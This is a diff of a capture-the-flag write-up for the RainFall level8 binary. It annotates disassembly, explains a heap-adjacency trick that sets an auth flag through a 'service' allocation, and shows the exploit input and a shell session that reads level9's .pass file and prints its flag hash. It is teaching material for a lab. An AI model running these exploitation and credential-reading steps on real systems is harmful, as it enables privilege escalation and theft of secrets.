@@ -1,81 +1,104 @@
 The program reads on stdin into a buffer of 0x80 bytes on the stack:
-0x08048596      a1809a0408     eax = dword [sym.stdin]    ; obj.stdin ; [0x8049a80:4]=0
-0x0804859b      89442408       dword [nitems] = eax    ; FILE *stream
-0x0804859f      c74424048000.  dword [size] = 0x80     ; [0x80:4]=-1 ; 128 ; int size
-0x080485a7      8d442420       eax = [src]             ; 0x20 ; 32
-0x080485ab      890424         dword [esp] = eax       ; char *s
-0x080485ae      e88dfeffff     sym.imp.fgets ()        ;[3] ; char *fgets(char *s, int size, FILE *stream)
+ 8048596:	a1 80 9a 04 08       	mov    eax,ds:0x8049a80			; stdin
+ 804859b:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
+ 804859f:	c7 44 24 04 80 00 00 	mov    DWORD PTR [esp+0x4],0x80
+ 80485a6:	00 
+ 80485a7:	8d 44 24 20          	lea    eax,[esp+0x20]
+ 80485ab:	89 04 24             	mov    DWORD PTR [esp],eax
+ 80485ae:	e8 8d fe ff ff       	call   8048440 <fgets@plt>
+
 The buffer is then compared against strings.
 
 This instruction block calls a shell for us:
-0x080486ec      7411           if (!var) goto 0x80486ff
-0x080486ee      c70424338804.  dword [esp] = str.bin_sh
-0x080486f5      e886fdffff     sym.imp.system ()
-0x080486fa      e975feffff     goto 0x8048574
+ 80486ec:	74 11                	je     80486ff <main+0x19b>
+ 80486ee:	c7 04 24 33 88 04 08 	mov    DWORD PTR [esp],0x8048833 ; "/bin/sh"
+ 80486f5:	e8 86 fd ff ff       	call   8048480 <system@plt>
+ 80486fa:	e9 75 fe ff ff       	jmp    8048574 <main+0x10>
 
-However this branch is only accessed when obj.auth[32] != 0:
-0x080486e2      a1ac9a0408     eax = dword [obj.auth]
-0x080486e7      8b4020         eax = dword [eax + 0x20]
-0x080486ea      85c0           var = eax & eax
-0x080486ec      7411           if (!var) goto 0x80486ff
 
-obj.auth is set here:
-0x08048628      7718           if (((unsigned) var) > 0) goto 0x8048642
-0x0804862a      8d442420       eax = [src]
-0x0804862e      8d5005         edx = [eax + 5]
-0x08048631      a1ac9a0408     eax = dword [obj.auth]
-0x08048636      89542404       dword [size] = edx
-0x0804863a      890424         dword [esp] = eax
-0x0804863d      e81efeffff     sym.imp.strcpy ()
+However this branch is only accessed when auth[32] != 0:
+ 80486e2:	a1 ac 9a 04 08       	mov    eax,ds:0x8049aac			; variable auth on bss
+ 80486e7:	8b 40 20             	mov    eax,DWORD PTR [eax+0x20]
+ 80486ea:	85 c0                	test   eax,eax
+ 80486ec:	74 11                	je     80486ff <main+0x19b>
+
+auth is set here:
+ 8048628:	77 18                	ja     8048642 <main+0xde>
+ 804862a:	8d 44 24 20          	lea    eax,[esp+0x20]
+ 804862e:	8d 50 05             	lea    edx,[eax+0x5]
+ 8048631:	a1 ac 9a 04 08       	mov    eax,ds:0x8049aac			; variable auth on bss
+ 8048636:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
+ 804863a:	89 04 24             	mov    DWORD PTR [esp],eax
+ 804863d:	e8 1e fe ff ff       	call   8048460 <strcpy@plt>
 
 and malloc'd here:
-0x080485e2      755e           if (var) goto 0x8048642
-0x080485e4      c70424040000.  dword [esp] = 4
-0x080485eb      e880feffff     sym.imp.malloc ()
-0x080485f0      a3ac9a0408     dword [obj.auth] = eax
-0x080485f5      a1ac9a0408     eax = dword [obj.auth]
-0x080485fa      c70000000000   dword [eax] = 0
+ 80485e2:	75 5e                	jne    8048642 <main+0xde>
+ 80485e4:	c7 04 24 04 00 00 00 	mov    DWORD PTR [esp],0x4
+ 80485eb:	e8 80 fe ff ff       	call   8048470 <malloc@plt>
+ 80485f0:	a3 ac 9a 04 08       	mov    ds:0x8049aac,eax		; variable auth on bss
+ 80485f5:	a1 ac 9a 04 08       	mov    eax,ds:0x8049aac		; variable auth on bss
+ 80485fa:	c7 00 00 00 00 00    	mov    DWORD PTR [eax],0x0
 
 This branch is reached when inputing a line beginning by "auth ":
-0x080485bb      8d442420       eax = [src]
-0x080485bf      89c2           edx = eax
-0x080485c1      b819880408     eax = str.auth            ; 0x8048819 ; "auth "
-0x080485c6      b905000000     ecx = 5
-0x080485cb      89d6           esi = edx
-0x080485cd      89c7           edi = eax
-0x080485cf      f3a6           repe cmpsb byte [esi],byte ptr es:[edi]
-0x080485d1      0f97c2         seta dl
-0x080485d4      0f92c0         setb al
-0x080485d7      89d1           ecx = edx
-0x080485d9      28c1           cl -= al
-0x080485db      89c8           eax = ecx
-0x080485dd      0fbec0         eax = al
-0x080485e0      85c0           var = eax & eax
-0x080485e2      755e           if (var) goto 0x8048642
+ 80485bb:	8d 44 24 20          	lea    eax,[esp+0x20]
+ 80485bf:	89 c2                	mov    edx,eax
+ 80485c1:	b8 19 88 04 08       	mov    eax,0x8048819				; "auth "
+ 80485c6:	b9 05 00 00 00       	mov    ecx,0x5
+ 80485cb:	89 d6                	mov    esi,edx
+ 80485cd:	89 c7                	mov    edi,eax
+ 80485cf:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
+ 80485d1:	0f 97 c2             	seta   dl
+ 80485d4:	0f 92 c0             	setb   al
+ 80485d7:	89 d1                	mov    ecx,edx
+ 80485d9:	28 c1                	sub    cl,al
+ 80485db:	89 c8                	mov    eax,ecx
+ 80485dd:	0f be c0             	movsx  eax,al
+ 80485e0:	85 c0                	test   eax,eax
+ 80485e2:	75 5e                	jne    8048642 <main+0xde>
 
 But the copy made by the strcpy only happens if the length of the string following "auth " is less then 30 (0x1e):
-0x08048600      8d442420       eax = [src]               ; 0x20 ; 32
-0x08048604      83c005         eax += 5
-0x08048607      c744241cffff.  dword [local_1ch] = 0xffffffff    ; [0xffffff
-0x0804860f      89c2           edx = eax
-0x08048611      b800000000     eax = 0
-0x08048616      8b4c241c       ecx = dword [local_1ch]    ; [0x1c:4]=-1 ; 28
-0x0804861a      89d7           edi = edx
-0x0804861c      f2ae           repne scasb al,byte es:[edi]
-0x0804861e      89c8           eax = ecx
-0x08048620      f7d0           eax = !eax
-0x08048622      83e801         eax -= 1
-0x08048625      83f81e         var = eax - 0x1e          ; 30
-0x08048628      7718           if (((unsigned) var) > 0) goto 0x8048642 ;[4]
+ 8048600:	8d 44 24 20          	lea    eax,[esp+0x20]
+ 8048604:	83 c0 05             	add    eax,0x5
+ 8048607:	c7 44 24 1c ff ff ff 	mov    DWORD PTR [esp+0x1c],0xffffffff
+ 804860e:	ff 
+ 804860f:	89 c2                	mov    edx,eax
+ 8048611:	b8 00 00 00 00       	mov    eax,0x0
+ 8048616:	8b 4c 24 1c          	mov    ecx,DWORD PTR [esp+0x1c]
+ 804861a:	89 d7                	mov    edi,edx
+ 804861c:	f2 ae                	repnz scas al,BYTE PTR es:[edi]
+ 804861e:	89 c8                	mov    eax,ecx
+ 8048620:	f7 d0                	not    eax
+ 8048622:	83 e8 01             	sub    eax,0x1
+ 8048625:	83 f8 1e             	cmp    eax,0x1e
+ 8048628:	77 18                	ja     8048642 <main+0xde>
 
-Since obj.auth and obj.service are allocated, we can rely on the fact that a second malloc of size <= 16 will likely be return right next to a first malloc of similar size.
-Which means that if we first send a "auth something\n" then "service something\n", &obj.auth[16] == obj_service; which means that obj_auth[32] is obj_service[16];
+Since auth and service are allocated, we can rely on the fact that a second malloc of size <= 16 will likely be return right next to a first malloc of similar size.
+Which means that if we first send a "auth something\n" then "service something\n", &auth[16] == service; which means that auth[32] is service[16];
 So we just need to do:
-cat > file << EOF
+cat > /tmp/file << EOF
 auth A
 serviceAAAAAAAAAAAAAAAA
 login
 EOF
 
-cat file - | ./level8
-and we got our SUID-shell
+cat /tmp/file - | ./level8
+
+
+level8@RainFall:~$ cat > /tmp/file << EOF
+> auth A
+> serviceAAAAAAAAAAAAAAAA
+> login
+> EOF
+level8@RainFall:~$ 
+level8@RainFall:~$ cat /tmp/file - | ./level8
+(nil), (nil) 
+0x804a008, (nil) 
+0x804a008, 0x804a018 
+whoami
+level9
+cat /home/user/level9/.pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+
+And we've got our flag.
+
